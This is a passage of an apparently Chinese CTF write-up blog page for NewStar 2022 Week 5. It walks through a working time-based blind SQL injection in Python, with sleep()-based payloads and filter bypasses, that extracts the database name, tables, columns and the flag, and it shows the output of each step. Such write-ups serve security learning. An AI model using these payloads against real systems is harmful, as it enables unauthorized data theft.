+</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">REQUEST_TTL</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">log</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Charactor &#39;</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&#39; missed.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sleep</span><span class="p">(</span><span class="n">SLEEP_INTERVAL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s1">&#39;?&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">log_result</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Matched &#39;</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&#39;!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">char</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">loop_str</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">R</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">log</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">log_result</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;逐字查找字符搜寻字符串
+</span></span></span><span class="line"><span class="cl"><span class="s2">    
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Args:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        payload (str): 接受两个 Format 位的字符串，第一个`</span><span class="si">{}</span><span class="s2">`代替为整型，第二个`</span><span class="si">{}</span><span class="s2">`代替为字符
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">R</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">log</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Testing index </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">char</span> <span class="o">=</span> <span class="n">test_char</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">index</span><span class="o">=</span><span class="n">i</span><span class="p">,</span> <span class="n">log</span><span class="o">=</span><span class="n">log</span><span class="p">,</span> <span class="n">log_result</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">char</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">+=</span> <span class="n">char</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">log</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Matched &#39;</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&#39; at the index </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;- Current result: &#34;</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s1">&#34;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">log_result</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[Result] &#34;</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s1">&#34;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先获取数据库名：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 获取数据库长度</span>
+</span></span><span class="line"><span class="cl"><span class="n">db_len</span> <span class="o">=</span> <span class="n">test_int</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="s2">&#34;if(length(database())=</span><span class="si">{}</span><span class="s2">,sleep(5),1)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">db_len</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取数据库名</span>
+</span></span><span class="line"><span class="cl"><span class="n">database</span> <span class="o">=</span> <span class="n">loop_str</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">db_len</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;if((substr(database(),</span><span class="si">{}</span><span class="s2">,1))=&#39;</span><span class="si">{}</span><span class="s2">&#39;,sleep(5),1)&#34;</span><span class="p">,</span> <span class="n">log</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">log_result</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">database</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到数据库名为 <code>wfy</code>.</p>
+<p>再求表个数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 求表个数</span>
+</span></span><span class="line"><span class="cl"><span class="n">table_count</span> <span class="o">=</span> <span class="n">test_int</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="s2">&#34;if((select(count(table_name))from(information_schema.tables)where(table_schema=database()))=</span><span class="si">{}</span><span class="s2">,sleep(5),1)&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到表的个数为 <code>3</code>.</p>
+<p>获取表名：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">table_name</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">table_count</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 查找表i名称的长度</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">len</span> <span class="o">=</span> <span class="n">test_int</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;if((select(length(table_name))from(information_schema.tables)where(table_schema=database())limit</span><span class="se">\x0C</span><span class="s2">&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;,1)=</span><span class="si">{}</span><span class="s2">,sleep(1),1)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="o">==</span><span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 查找表i的名称</span>
+</span></span><span class="line"><span class="cl">    <span class="n">table_name</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">loop_str</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;if(substr((select(table_name)from(information_schema.tables)where(table_schema=database())limit</span><span class="se">\x0C</span><span class="s2">&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;,1),</span><span class="si">{}</span><span class="s2">,1)=&#39;</span><span class="si">{}</span><span class="s2">&#39;,sleep(1),1)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log_result</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">log</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出结果即为表名：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">[</span><span class="s1">&#39;wfy_admin&#39;</span><span class="p">,</span> <span class="s1">&#39;wfy_comments&#39;</span><span class="p">,</span> <span class="s1">&#39;wfy_information&#39;</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>猜想 <code>wfy_comments</code> 为储存具体数据的表。查找其列名：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">column_name</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="n">column_num</span> <span class="o">=</span> <span class="n">test_int</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="s2">&#34;if((select(count(column_name))from(information_schema.columns)where(table_name=&#39;wfy_comments&#39;))=</span><span class="si">{}</span><span class="s2">,sleep(1),1)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">column_num</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 查找列i名称的长度</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">len</span> <span class="o">=</span> <span class="n">test_int</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;if((select(length(column_name))from(information_schema.columns)where(table_name=&#39;wfy_comments&#39;)limit</span><span class="se">\x0C</span><span class="s2">&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;,1)=</span><span class="si">{}</span><span class="s2">,sleep(1),1)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 查找列i的名称</span>
+</span></span><span class="line"><span class="cl">    <span class="n">column_name</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">loop_str</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;if(substr((select(column_name)from(information_schema.columns)where(table_name=&#39;wfy_comments&#39;)limit</span><span class="se">\x0C</span><span class="s2">&#34;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;,1),</span><span class="si">{}</span><span class="s2">,1)=&#39;</span><span class="si">{}</span><span class="s2">&#39;,sleep(1),1)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log_result</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">log</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">column_name</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出结果即为列名：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="s1">&#39;text&#39;</span><span class="p">,</span> <span class="s1">&#39;user&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;display&#39;</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>猜想 <code>text</code> 为储存数据的列。先获取列的字段个数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="n">test_int</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="s2">&#34;if((select(count(text))from(wfy.wfy_comments))=</span><span class="si">{}</span><span class="s2">,sleep(1),1)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到字段个数为 <code>12</code>.</p>
+<p>查找 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">passed</span> <span class="o">=</span> <span class="n">test_pass</span><span class="p">(</span><span class="s2">&#34;if(substr((select(user)from(wfy.wfy_comments)limit</span><span class="se">\x0C</span><span class="s2">&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;,1),1,1)=&#39;f&#39;,sleep(1),1)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">passed</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">len</span> <span class="o">=</span> <span class="n">test_int</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="s2">&#34;if((select(length(user))from(wfy.wfy_comments)limit</span><span class="se">\x0C</span><span class="s2">&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;,1)=</span><span class="si">{}</span><span class="s2">,sleep(1),1)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="n">loop_str</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;if(substr((select(user)from(wfy.wfy_comments)limit</span><span class="se">\x0C</span><span class="s2">&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;,1),</span><span class="si">{}</span><span class="s2">,1)=&#39;</span><span class="si">{}</span><span class="s2">&#39;,sleep(1),1)&#34;</span><span class="p">,</span> <span class="n">log_result</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">log</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出结果为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">[</span><span class="s1">&#39;flag</span><span class="si">{ju2t_let_me_s1eep_f0r_a_whi1e}</span><span class="s1">&#39;</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是提交的 flag 为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">flag{Ju2t_let_me_s1eep_f0r_a_whi1e}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于上述是使用延时盲注，所以脚本判断if是否判真并不稳定，可以通过修改脚本开头的 <code>REQUEST_TTL</code> 进行调整。但是耗时长是一个重大问题。</p>
+</div>
+
+        <div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="https://image.cnily.top/avatar.png?imageMogr2/format/webp"
+        srcset="https://image.cnily.top/avatar.png?imageMogr2/format/webp, https://image.cnily.top/avatar.png?imageMogr2/format/webp 1.5x, https://image.cnily.top/avatar.png?imageMogr2/format/webp 2x"
+        sizes="auto"
+        alt="https://image.cnily.top/avatar.png?imageMogr2/format/webp"title=""></div><p class="sponsor-bio"><em>如果你觉得这篇文章对你有所帮助，欢迎赞赏~</em></p><a href="https://space.bilibili.com/314148718" target="_blank" class="sponsor-button" rel="noopener noreferrer">
+                <i class="far fa-heart fa-fw icon" style="color: #ec6cb9;"></i>
+                <span>赞赏</span>
+            </a></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-10-23</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/posts/ctf/wp/2022/newstar-week5/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/Cnily03/cnily.me/blob/master/content/posts/ctf/wp/2022/NewStar-week5.md?plain=1 target="_blank" rel="noopener noreferrer">查看源代码</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/Cnily03/cnily.me/issues/new?labels=website,posts,bug&body=|Origin|File|%0A|-|-|%0A|[%E9%A2%98%E8%A7%A3+-+NewStar+2022+Week+5](https://cnily.me/posts/ctf/wp/2022/newstar-week5/)|[🔗Github](https://github.com/Cnily03/cnily.me/blob/master/content/posts/ctf/wp/2022/NewStar-week5.md?plain=1)|%0A--- target="_blank" rel="noopener noreferrer">报告问题</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span><a href="#" title="分享到 Twitter" data-sharer="twitter" data-url="https://cnily.me/posts/ctf/wp/2022/newstar-week5/" data-title="题解 - NewStar 2022 Week 5" data-hashtags="CTF,Writeup"><i class="fab fa-twitter fa-fw"></i></a><a href="#" title="分享到 Facebook" data-sharer="facebook" data-url="https://cnily.me/posts/ctf/wp/2022/newstar-week5/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw"></i></a><a href="#" title="分享到 微博" data-sharer="weibo" data-url="https://cnily.me/posts/ctf/wp/2022/newstar-week5/" data-title="题解 - NewStar 2022 Week 5"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/writeup/">Writeup</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/lifelong-bonus/" class="prev" rel="prev" title="Lifelong Bonus"><i class="fas fa-angle-left fa-fw"></i>Lifelong Bonus</a>
+            <a href="/posts/wenyan/gushi-shuo/" class="next" rel="next" title="顾史说">顾史说<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article><link rel="stylesheet" href="https://cnily.me/v/css/sponsor.css">
+        
+            <script type="text/javascript" src="https://cnily.me/v/js/auto-indent.js"></script>
+        
+        
+            <script type="text/javascript" src="https://cnily.me/v/js/sponsor.js"></script>
+        
+        
+</div>
+        </main><footer class="footer">
+        <style>.footer-split{margin:0 .5em}.footer-split::after{content:"|"}</style>
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <span id='footer-engine'><a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.105.0">Hugo</a></span><span class="footer-split"></span>Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/Cnily03" target="_blank" rel="noopener noreferrer">Cnily03</a></span><span class="footer-split"></span><span class="license"><a data-tooltip="License might be changed if particularly declared" class="tooltip" rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer>
+        
+            <script type="text/javascript" src="https://cnily.me/v/js/naughty-footer.js"></script>
+        
+        
+</div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" onclick="window.scroll(window.scrollX, 0); return !1;" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{},"data":{"desktop-header-typeit":"Cnily03 Home","mobile-header-typeit":"Cnily03 Home"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":5000,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
